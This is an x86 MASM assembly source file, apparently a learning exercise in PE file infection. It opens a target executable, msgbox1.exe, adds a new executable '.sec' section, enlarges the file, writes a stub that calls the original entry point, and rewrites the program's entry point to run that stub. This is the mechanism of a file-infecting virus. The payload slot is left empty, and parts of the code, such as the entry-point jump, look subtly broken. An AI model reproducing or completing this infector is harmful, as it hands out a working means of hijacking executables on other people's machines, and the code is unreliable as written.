; malbox.asm
	
.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\user32.inc
      include \masm32\include\kernel32.inc

      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib

.data
	szFileName db 	"../msgbox1/msgbox1.exe",0

.code

start:
	sub		esp, 12 ; Allocate space for handle + File Header pointer
	call	open_file
	call	create_mapping
	call	map_view
	sub		esp, 4	; Allocate space for PE header
	call	get_pe_header
	call	add_section_header
	
	call	close_file
	add		esp, 4	; move esp to correct position
	call	open_file
	call	extend_mapping
	call	map_view
	sub		esp, 4	; Allocate space for PE header
	call	get_pe_header

	call	write_malcode
	
	call	close_file
	add		esp, 16	; remove all space for variables

	jmp _end
	
open_file:
    push    NULL ; hTemplateFile
    push    FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes
    push    OPEN_EXISTING ; dwCreationDisposition
    push    NULL ; lpSecurityAttributes
    push    FILE_SHARE_WRITE OR FILE_SHARE_READ ; dwShareMode
    push    GENERIC_READ OR GENERIC_WRITE ; dwDesiredAccess
    push    offset szFileName ; lpFileName
    call    CreateFileA
	mov		[esp+12], eax	; save handle
	ret

create_mapping:
    push    NULL ; lpName
    push    0 ; dwMaxSizeLow
    push    0 ; dwMaxSizeHigh
    push    PAGE_READWRITE ; flProtect
    push    NULL ; lpFileMappingAttributes
    push    eax ; hFile
    call    CreateFileMappingA
	mov		[esp+8], eax	; save handle
	ret

extend_mapping:
	mov		edi, eax
	; GetFileSize
	push 	NULL ; lpFileSizeHigh
	push	edi ; hFile
	call	GetFileSize

	add		eax, 200h
	push	eax ; Save new file size

	; SetFilePointer
	push	FILE_BEGIN ; dwMoveMethod
	push	NULL ; lpDistanceToMovehigh
	push	eax  ; lDistanceToMove
	push	edi ; hFile
	call	SetFilePointer
	
	push	edi ; hFile+200h
	call	SetEndOfFile
	add		esp, 4	; remove saved variables
	mov		eax, edi
	jmp		create_mapping

map_view:
    push    NULL ;dwNumberOfBytesToMap
    push    0 ;dwFileOffsetLow
    push    0 ;dwFileOffsetHigh
    push    FILE_MAP_WRITE; dwDesiredAccess
    push    eax ; hFileMappingObject
    call    MapViewOfFile
	mov		[esp+4], eax	; save pointer to file header
	ret
	
close_file:
	mov		eax, [esp+8]	; get file_header
	push	0	; dwNumberOfBytesToFlush
	push	eax	; lpBaseAddress
	call	FlushViewOfFile
	
	mov		eax, [esp+12]	; get mapping handle
	push	eax	; hObject
	call	CloseHandle
	
	mov		eax, [esp+16]	; get file handle
	push	eax	; hObject
	call	CloseHandle
	
	ret

get_pe_header:
	mov		esi, [esp+8]	; get image_dos_header
	add		esi, 3Ch	; mov pointer to e_lfanew
	lodsd	; read pe header offset
	add		eax, [esp+8]	; get pe header pointer
	mov		[esp+4], eax	; save pointer
	ret

add_section_header:
	mov		esi, [esp+4]	; get pe header
	
increase_section_count:
	add		esi, 6h		; move pointer to section count
	lodsw	; read section count
	inc		eax	; increase section count
	sub		esi, 2h	; move pointer back to section count
	mov		edi, esi	; move to destination pointer
	stosw	; write new section count
	mov		cx, ax
	
get_opt_header_size:
	mov		esi, [esp+4]	; get pe Header
	add		esi, 14h	; point to size of opt_header
	lodsw	; get size opt_header_size
	push	ax	; save opt_header_size
	
get_section_info:
	mov		esi, [esp+6]	; get pe Header
	add		esi, 38h	; move to section_alignment
	lodsd	; read section_alignment
	push eax	; save section_alignment
	lodsd	; read file_alignment
	push eax	; save file_alignment
	
change_sizeofimage:
	add		esi, 10h	; go to size of image_dos_header
	lodsd
	add		eax, [esp+4]	; add section alignment
	mov		edi, esi	; move address to destination
	sub		edi, 4	; move address back to size of image_dos_header
	stosd	; write new size of image
	
	
move_to_sec_headers:
	mov		esi, [esp+14]	; get pe_header
	add		esi, 18h	; move to opt_header
	add		si, [esp+8]	; move to section_headers
	
	push	cx	; save header counter
	push	esi	; save header address
	mov		eax, 0h	; set 0
	push	eax
	push	eax	; allocate space for virtual address and pointer to raw data

is_last_header:
	dec		cx	; decrease section count
	mov		[esp+12], cx
	cmp		cx, 0 ; compare if new section
	jz		write_new_header
	
compare_virtual_address:
	add		esi, 0Ch	; move pointer to virtual address
	lodsd	; read virtual address
	cmp		[esp+4], eax	; is new address bigger
	jg		compare_raw_data	; if not, compare raw data
	mov		[esp+4], eax	; save new address
	
compare_raw_data:
	add		esi, 4	; move pointer to pointer to raw data
	lodsd	; read pointer
	cmp		[esp], eax	; is new address bigger
	jg		iter_header	; if not, end iter
	mov		[esp], eax	; save new address
	sub		esi, 8	; move pointer to size of raw data
	lodsd	; read size
	add		[esp], eax	; add size to raw data pointer
	
iter_header:
	mov		esi, [esp+8]	; get current header address
	mov		ecx, [esp+12]	; get section count
	add		esi, 28h	; move pointer to next section
	mov		[esp+8], esi	; save new section header
	jmp		is_last_header

write_new_header:
	mov		eax, 6365732Eh	; write section name
	mov		edi, esi	; move pointer to destination
	stosd	; write name
	add		edi, 4
	mov		eax, [esp+14]	; get file alignment
	stosd	; write virtual size
	mov		eax, [esp+18]	; get section alignment
	add		eax, [esp+4]	; add highest virtual address
	stosd	; write virtual address
	mov		eax, [esp+14]	; get file alignment
	stosd	; write sizeofrawdata
	mov		eax, [esp]	; get raw data pointer
	stosd	; write address
	add		edi, 0Ch	; move pointer to characteristics
	mov		eax, 60000020h	; move CODE|EXEC|READ to eax
	stosd	; write characteristics
	
section_finish:
	add		esp, 18h	; clear stored variables in stack
	ret
	
write_malcode:
	; Get original entry point
	mov		esi, [esp+4]	; get pe Header
	add		esi, 28h	; move pointer to address of entry point
	lodsd	; get address of original entry point
	push	eax	; save OEP (RVA)
	lodsd	; get BaseOfCode
	push	eax	; save base of code (RVA)
	
get_pointer_virtual:
	mov		esi, [esp+12]	; get pe header
	add		esi, 6h	; move to section count
	lodsw	; get section count
	mov		cx, ax	; mov counts
	add		esi, 0Ch	; move to opt_header_size
	lodsw	; read opt_header_size
	add		esi, 2h	; move to opt_header
	add		esi, eax	; move to section Header
	mov		edx, 0h	; set virt address to 0
	
iter_sec_header:
	dec		cx	; decrease counter
	add		esi, 0Ch	; move to virt_address
	lodsd	; read virt_address
	mov		edx, eax
	add		esi, 18h	; move to next section
	cmp		cx, 0	; is last section
	jnz		iter_sec_header
	
write_new_code:
	mov		edi, esi	; move address to destination
	mov		eax, [esp+12]	; get pe header
	add		eax, edx	; add virt_address
	mov		[esp+4], eax	; remove base of code with new entry point
	
	; write code
	
	
	; write jmp to OEP
	mov		eax, 0B8h
	stosb
	mov		eax, [esp+8]
	stosd	;mov eax, [esp+8]	; get OEP
	mov		eax, 0FFD0h
	stosw	;call eax	; call function at eax
	
overwrite_oep:
	mov		edi, [esp+12]	; get pe Header
	add		edi, 28h	; move pointer to entry point
	mov		eax, [esp+4]	; get new entry point
	sub		eax, [esp+12]	; Get RVA of new entry point
	stosd	; overwrite entry point with new
	
	add		esp, 8	; remove variables from stack
	ret

_end:
	push 0
	call ExitProcess
	
end start